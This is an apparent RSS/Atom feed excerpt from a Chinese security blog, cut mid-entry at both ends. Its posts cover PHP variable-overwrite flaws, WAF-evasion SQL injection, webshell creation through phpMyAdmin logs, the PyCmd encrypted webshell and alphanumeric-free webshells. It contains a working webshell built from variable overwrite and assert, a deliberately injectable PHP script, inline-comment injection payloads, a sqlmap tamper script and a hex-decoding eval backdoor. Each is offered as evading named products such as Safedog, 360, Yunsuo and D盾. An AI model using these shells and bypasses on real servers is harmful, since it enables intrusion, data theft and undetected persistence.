title="总结"></a>总结</h4><p>此漏洞涉及到php编程中的面向对象问题、addslashes()函数等知识点，比较基础</p>]]></content>
    
    <summary type="html">
    
      Seay法师的《代码审计》一书中案例的复现集合
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="代码审计" scheme="https://www.0x002.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="读书笔记" scheme="https://www.0x002.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞学习及在webshell中的运用</title>
    <link href="https://www.0x002.com/2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"/>
    <id>https://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/</id>
    <published>2018-07-08T19:52:15.000Z</published>
    <updated>2019-06-17T16:07:22.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、发生条件："><a href="#一、发生条件：" class="headerlink" title="一、发生条件："></a>一、发生条件：</h2><p>函数使用不当（$$、extract()、parse_str()、import_request_variables()等）<br>开启全局变量</p><h2 id="二、基础了解："><a href="#二、基础了解：" class="headerlink" title="二、基础了解："></a>二、基础了解：</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.$$定义"></a>1.$$定义</h3><p>$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。<br><a id="more"></a><br>举个简单例子：<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdad38e1.png"><br>变量a被定义成了字符串hello 而变量$a被定于成了字符串world!<br>但同时$a本身也是个变量<br>$$a就可以代表两个含义$($a)和$(hello) 两个变量<br>此时输出的结果如图：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdad38a9.png"></p><h3 id="2-extract-定义"><a href="#2-extract-定义" class="headerlink" title="2.extract()定义"></a>2.extract()定义</h3><p>extract()可以从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值<br>语法结构：extract(array,extract_rules,prefix)<br>i.array为必选参数（此参数必须为数组型数据）<br>ii.extract_rules为可选参数，可选的值有：<br>● EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>● EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>● EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>● EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>● EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。<br>● EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>● EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>● EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>iii.prefix为可选参数（此参数暂不解释）<br>举个例子：<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdadac53.png"><br>在开头我们定义了一个数组d<br>然后我们使用extract()函数并将array参数填写为数组d<br>此时数组d中的键名将当做新的变量名来创建一个新的变量，而新的变量的值即为在数组中对应的值。（注意如果之前有声明过同一个变量,那么该变量将被覆盖。如果之后才声明将不会出现变量覆盖的现象）<br>此时输出结果为：<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdadac1e.png"><br>可以看到我们之前并未声明过a、b、c变量，但是仍可输出。</p><h3 id="3-parse-str-定义："><a href="#3-parse-str-定义：" class="headerlink" title="3.parse_str()定义："></a>3.parse_str()定义：</h3><p>把查询字符串解析到变量中<br>语法：parse_str(string,array)<br>string为必选参数<br>array为可选参数<br>举个例子<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdae279d.png"><br>可以看到此函数将name和age初始化成了变量，且值为等号右边的值<br>当array参数存在时：<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdae96e7.png"><br>4.import_request_varibles()定义<br>将 GET/POST/Cookie 变量导入到全局作用域中<br>此函数相当于开启全局变量注册<br>语法import_request_variables(string $types ,string $prefix )<br>第一个参数为必选<br>第二个参数为可选<br>例子：<br>import_request_variables(“GPC”)<br>使用此方法即可开启对_POST、_GET、_COOKIE的全局变量注册<br>当第二个参数存在时将会加上一个前缀</p><h2 id="三、经典案例"><a href="#三、经典案例" class="headerlink" title="三、经典案例"></a>三、经典案例</h2><h3 id="1-经典-变量覆盖"><a href="#1-经典-变量覆盖" class="headerlink" title="1.经典$$变量覆盖"></a>1.经典$$变量覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key &#x3D;&gt; $_value) &#123;</span><br><span class="line">        $$_key &#x3D; addslashes($_value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一段非常经典的$$注册变量导致的变量覆盖代码，很多应用上都出现过<br>可以看出$_key为COOKIE POST GET中的参数<br>比如提交?a=1 则$_key的值为a<br>而下面的$$_key则会有$a的意思，结合起来就变成了$a = addslashes($_value)<br>这样便会覆盖原有的变量a的值<br>我们来运行一下：<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdb04b50.png"><br>可以看到变量a被我们覆盖掉了</p><h3 id="2-部分cms变量覆盖案例："><a href="#2-部分cms变量覆盖案例：" class="headerlink" title="2.部分cms变量覆盖案例："></a>2.部分cms变量覆盖案例：</h3><p>MetInfo全局变量覆盖另类突破防注入<br><a href="http://www.weixianmanbu.com/article/84.html" target="_blank" rel="noopener">http://www.weixianmanbu.com/article/84.html</a><br>齐博CMS变量覆盖导致sql注入漏洞<br><a href="http://bobao.360.cn/learning/detail/291.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/291.html</a><br>Destoon 20140530最新版超全局变量覆盖导致的安全问题<br><a href="http://0day5.com/archives/1855/" target="_blank" rel="noopener">http://0day5.com/archives/1855/</a></p><h2 id="四、变量覆盖玩出新花样之一句话木马bypass某狗"><a href="#四、变量覆盖玩出新花样之一句话木马bypass某狗" class="headerlink" title="四、变量覆盖玩出新花样之一句话木马bypass某狗"></a>四、变量覆盖玩出新花样之一句话木马bypass某狗</h2><p>经过我们简单的测试，我们可以了解到：当我们使用assert函数时，如果函数的参数是可控，那么某狗拦截。例如:assert($_POST[a])或者$a=$_POST[c];assert($a)这些都是拦截<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdb03b70.png"></p><p>但是如果我们只有assert($a)这一句时，我们发现他就不会进行拦截了<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdb03bfc.png"><br>这就值得我们思考了，为什么这样不会拦截呢？<br>我认为应该是某狗觉得这个变量a是不可控的，所以就认为这不是木马<br>那如果这时我们在联系一下变量覆盖漏洞呢？<br>在这里我选用了上面的案例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key &#x3D;&gt; $_value) &#123;</span><br><span class="line">        $$_key &#x3D; addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>把addslashes()删掉 然后把代码精简下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_POST&#39;) as $_r)&#123;foreach($$_r as $_k &#x3D;&gt; $_v) &#123;$$_k &#x3D; $_v;&#125;&#125;</span><br></pre></td></tr></table></figure><br>最终代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php foreach(array(&#39;_POST&#39;) as $_r)&#123;foreach($$_r as $_k &#x3D;&gt; $_v) &#123;$$_k &#x3D; $_v;&#125;&#125;;assert($a);?&gt;</span><br></pre></td></tr></table></figure><br>成功bypass<br> <img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/09/5b426fdb06bb0.png"></p>]]></content>
    
    <summary type="html">
    
      对于变量覆盖漏洞的简单学习及其在其他方面的拓展例子
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="奇淫技巧" scheme="https://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="过狗" scheme="https://www.0x002.com/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>[转]绕过360,安全狗,D盾等进行Sql注入</title>
    <link href="https://www.0x002.com/2017/%5B%E8%BD%AC%5D%E7%BB%95%E8%BF%87360,%E5%AE%89%E5%85%A8%E7%8B%97,D%E7%9B%BE%E7%AD%89%E8%BF%9B%E8%A1%8CSql%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.0x002.com/2017/[转]绕过360,安全狗,D盾等进行Sql注入/</id>
    <published>2017-08-24T16:07:39.000Z</published>
    <updated>2019-06-17T16:30:31.728Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者-Bypass"><a href="#作者-Bypass" class="headerlink" title="作者:Bypass"></a>作者:Bypass</h4><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在测试过程中，经常会遇到一些主机防护软件，对这方面做了一些尝试，可成功bypass了GET和POST的注入防御，分享一下姿势。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a><strong>0x02 环境搭建</strong></h2><p>Windows Server 2003+phpStudy</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c36bcac0f.png"></p><p>sql注入点测试代码：<br><a id="more"></a><br>sql.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con &#x3D; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">if (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">mysql_select_db(&quot;test&quot;, $con);</span><br><span class="line">$id &#x3D; $_REQUEST[ &#39;id&#39; ];</span><br><span class="line">$query  &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; $id &quot;;</span><br><span class="line">$result &#x3D; mysql_query($query);</span><br><span class="line">while($row &#x3D; mysql_fetch_array($result))</span><br><span class="line">  &#123;</span><br><span class="line">  echo $row[&#39;0&#39;] . &quot; &quot; . $row[&#39;1&#39;];</span><br><span class="line">  echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>运行效果：</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c38abbd51.png"></p><h2 id="0x03-Bypass-过程"><a href="#0x03-Bypass-过程" class="headerlink" title="0x03 Bypass 过程"></a><strong>0x03 Bypass 过程</strong></h2><p>对不同waf做了一些尝试，关于SQL注入bypass，可以考虑划分为3种：</p><p>1、完全bypass（union select+select from）</p><p>2、部分bypass（union select 或select from）</p><p>3、获取一些敏感信息（如version()、database()等）</p><p><strong>A、Union+select</strong></p><p>先考虑如何绕过union+select，可以考虑一下几种形式</p><p>1、最常见形式 %20、+、/**/</p><p>2、Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0</p><p>3、内联注释   /!12345select/</p><p>通过组合测试，可以发现 union%0a/<em>!12345select</em>/ 1,2 可以绕过防御。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c3c49a497.png"></p><p>B、<strong>select+from</strong></p><p><strong>　　</strong>select+from 也可以通过同样的组合形式绕过防御。</p><p>至此已完全绕过union+select+from。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c3eccea2c.png"></p><h2 id="0x04-自动化注入"><a href="#0x04-自动化注入" class="headerlink" title="0x04 自动化注入"></a><strong>0x04 自动化注入</strong></h2><p>编写tamper bypass脚本，来利用sqlmap来跑数据</p><p>先看一下原始sqlmap的效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u  http:&#x2F;&#x2F;192.168.106.130&#x2F;config&#x2F;sql.php?id&#x3D;1  --flush-session --dbs   失败</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c4069255b.png"></p><p>加载tamper脚本，可成功获取数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;192.168.106.130&#x2F;config&#x2F;sql.php?id&#x3D;1 --flush-session  --technique&#x3D;U --tamper&#x3D;&quot;360safe.py&quot; --dbs</span><br></pre></td></tr></table></figure></p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c4214f10f.png"></p><p>tamper脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">write by Aaron</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces keywords</span><br><span class="line">    &gt;&gt;&gt; tamper(&#39;UNION SELECT id FROM users&#39;)</span><br><span class="line">    &#39;union%0a&#x2F;*!12345select*&#x2F;id%0a&#x2F;*!12345from*&#x2F;users&#39;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if payload:</span><br><span class="line">        payload&#x3D;payload.replace(&quot; ALL SELECT &quot;,&quot;%0a&#x2F;*!12345select*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a&#x2F;*!12345select*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot; FROM &quot;,&quot;%0a&#x2F;*!12345from*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;CAST(&quot;,&quot;&#x2F;*!12345CASt(*&#x2F;&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;)</span><br><span class="line"></span><br><span class="line">    return payload&lt;&#x2F;pre&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class&#x3D;&quot;cnblogs_code_copy&quot;&gt;&lt;a title&#x3D;&quot;复制代码&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><br>这边主要是针对union select查询进行的关键字替换，测试过程中，可以发现利用tamper脚本来bypass的弊端，sqlmap的部分payload是固定的，部分关键字会被waf拦截，需要一步步调试，总结，测试哪些关键字是被拦截的，如何绕过关键字的检测等，还是挺麻烦。</p><h2 id="0x05-END"><a href="#0x05-END" class="headerlink" title="0x05 END"></a><strong>0x05 END</strong></h2><p>最好的自动化注入工具：可以考虑自己编写一个自动化注入工具，灵活的自定义payload来获取数据库信息。</p><p>目前的测试成果，可成功bypass注入防御，如 安全狗、云锁、360主机卫士、D盾_IIS防火墙等主机防护软件及各种云waf，有些姿势都在用。</p><p>原文链接：<a href="https://www.cnblogs.com/xiaozi/p/7275134.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7275134.html</a></p>]]></content>
    
    <summary type="html">
    
      简单fuzz找bypass的payload
    
    </summary>
    
      <category term="技术文章" scheme="https://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="SQL注入" scheme="https://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="奇淫技巧" scheme="https://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="D盾" scheme="https://www.0x002.com/tags/D%E7%9B%BE/"/>
    
      <category term="过狗" scheme="https://www.0x002.com/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>[转]phpmyadmin日志拿shell</title>
    <link href="https://www.0x002.com/2017/%5B%E8%BD%AC%5Dphpmyadmin%E6%97%A5%E5%BF%97%E6%8B%BFshell/"/>
    <id>https://www.0x002.com/2017/[转]phpmyadmin日志拿shell/</id>
    <published>2017-08-24T08:42:15.000Z</published>
    <updated>2019-06-17T16:30:21.412Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者：珍惜少年时"><a href="#作者：珍惜少年时" class="headerlink" title="作者：珍惜少年时"></a>作者：珍惜少年时</h4><h2 id="前提：条件是root用户。"><a href="#前提：条件是root用户。" class="headerlink" title="前提：条件是root用户。"></a><strong>前提：</strong>条件是root用户。</h2><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！</p><p>要先把general log设置为ON<br><a id="more"></a><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c4bac2fe0.png"></p><p>然后将文件修改日志文件名修改。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c4d204d5d.png"></p><p>本来是在mysql下的一个log日志文件的，我重新改到了phpstudy目录下然后命名为def2.php</p><p>然后随便执行一条sql语句。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c4ed0b163.png"></p><p>菜刀连接之。</p><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b43c506286db.png"></p><p>原文链接：<a href="https://www.cnblogs.com/xishaonian/p/6622818.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6622818.html</a></p>]]></content>
    
    <summary type="html">
    
      经典的phpmyadmin日志拿shell
    
    </summary>
    
      <category term="技术文章" scheme="https://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="phpmyadmin" scheme="https://www.0x002.com/tags/phpmyadmin/"/>
    
      <category term="奇淫技巧" scheme="https://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>[转]利用PyCmd加密隐形木马，成功绕过D盾</title>
    <link href="https://www.0x002.com/2017/%5B%E8%BD%AC%5D%E5%88%A9%E7%94%A8PyCmd%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87D%E7%9B%BE/"/>
    <id>https://www.0x002.com/2017/[转]利用PyCmd加密隐形木马，成功绕过D盾/</id>
    <published>2017-08-20T09:05:14.000Z</published>
    <updated>2019-06-17T16:30:27.392Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者：nmask"><a href="#作者：nmask" class="headerlink" title="作者：nmask"></a>作者：nmask</h4><hr><p><strong>之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href="http://www.kongdewei.cn/" target="_blank" rel="noopener">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。</strong></p><h2 id="PyCmd适用环境"><a href="#PyCmd适用环境" class="headerlink" title="PyCmd适用环境"></a>PyCmd适用环境</h2><p>当服务器允许上传任意文件，且对文件内容不进行审计检查，但由于其网络边界有防火墙会拦截审计通信的数据。这时我们能成功上传一句话木马，然而连接菜刀的时候会出现500错误，此时可以使用pycmd工具，因为其会对互相通信的内容加密处理。<br><a id="more"></a></p><h2 id="PyCmd使用"><a href="#PyCmd使用" class="headerlink" title="PyCmd使用"></a>PyCmd使用</h2><p>我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。</p><p>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p><p>php网站木马地址：10.0.3.13/test/p.php</p><p>jsp网站木马地址：192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp</p><p>查看shell的情况：</p><p><a href="http://image.3001.net/images/20170714/15000049747112.png" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="浅析PyCmd加密隐形木马" class="lazyload" data-src="http://image.3001.net/images/20170714/15000049747112.png!small"></a></p><p>此时，运行PyCmd.py程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyCmd.py -u http:&#x2F;&#x2F;10.0.3.13&#x2F;test&#x2F;p.php -p test [--proxy]</span><br></pre></td></tr></table></figure><br>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyCmd.py -u http:&#x2F;&#x2F;192.168.10.149:8080&#x2F;headgmp&#x2F;upload&#x2F;2017_07_13&#x2F;11.jsp -p test [--proxy]</span><br></pre></td></tr></table></figure></p><p><img src="/img/loading.gif" alt="浅析PyCmd加密隐形木马" class="lazyload" data-src="http://image.3001.net/images/20170714/15000049277207.png"></p><p>程序会自动判断输入的网站类型，这里是jsp类型的网站。</p><p>运行程序可输入以下参数：</p><blockquote><p>-h 查看帮助信息</p><p>-u 网站木马地址</p><p>-p 木马shell密码</p><p>–proxy 开启本地代理（方便调试）<br>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p></blockquote><h2 id="PyCmd数据加密"><a href="#PyCmd数据加密" class="headerlink" title="PyCmd数据加密"></a>PyCmd数据加密</h2><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。</p><p>当执行cmd命令时，通过Fiddler抓包查看数据：</p><p><img src="/img/loading.gif" alt="浅析PyCmd加密隐形木马" class="lazyload" data-src="http://image.3001.net/images/20170717/15002739431723.png"></p><p>查看回报信息：</p><p><img src="/img/loading.gif" alt="浅析PyCmd加密隐形木马" class="lazyload" data-src="http://image.3001.net/images/20170717/15002739773897.png"></p><h2 id="PyCmd木马隐身"><a href="#PyCmd木马隐身" class="headerlink" title="PyCmd木马隐身"></a>PyCmd木马隐身</h2><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀（2016.9.18日检测结果）</p><p>这里演示php木马查杀：</p><blockquote><p>&lt;?php</p><p>$string=”;</p><p>$password=’test’;</p><p>if(isset($_POST[$password])){</p><p>$hex=$_POST[$password];</p><p>for($i=0;$i&lt;strlen($hex)-1;$i+=2){</p><p>$string.=chr(hexdec($hex[$i].$hex[$i+1]));</p><p>}</p><p>@eval($string);</p><p>}else{</p><p>echo “This is a Test!”;</p><p>}</p><p>?&gt;</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a><a href="http://image.3001.net/images/20170717/15002740265116.png" target="_blank" rel="noopener"><img src="/img/loading.gif" alt="PyCmd 加密隐形木马" class="lazyload" data-src="http://image.3001.net/images/20170717/15002740265116.png!small"></a></h3><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>PyCmd <a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="noopener">下载地址</a></p><p>项目地址：<a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="noopener">https://github.com/tengzhangchao/PyCmd</a></p><p>说明：绕过防火墙检测的方法很多，这里只是提供了一种思路，pycmd是我去年写的一款工具，最近打算完善其功能，代码已经开源。</p><p>原文连接：<a href="https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/" target="_blank" rel="noopener">https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/</a></p>]]></content>
    
    <summary type="html">
    
      绕过D盾连接shell
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.0x002.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="奇淫技巧" scheme="https://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="D盾" scheme="https://www.0x002.com/tags/D%E7%9B%BE/"/>
    
      <category term="webshell" scheme="https://www.0x002.com/tags/webshell/"/>
    
      <category term="过狗" scheme="https://www.0x002.com/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>[转]一些不包含数字和字母的webshell</title>
    <link href="https://www.0x002.com/2017/%5B%E8%BD%AC%5D%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
    <id>https://www.0x002.com/2017/[转]一些不包含数字和字母的webshell/</id>
    <published>2017-07-27T07:29:14.000Z</published>
    <updated>2019-06-17T16:30:35.695Z</updated>
    
    <content type="html"><![CDATA[<h4 id="作者：离别歌"><a href="#作者：离别歌" class="headerlink" title="作者：离别歌"></a>作者：离别歌</h4><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line">  eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么，这个代码如何利用？<br><a id="more"></a></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_1" target="_blank" rel="noopener">思路</a></h3><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，<strong>变换方法</strong> 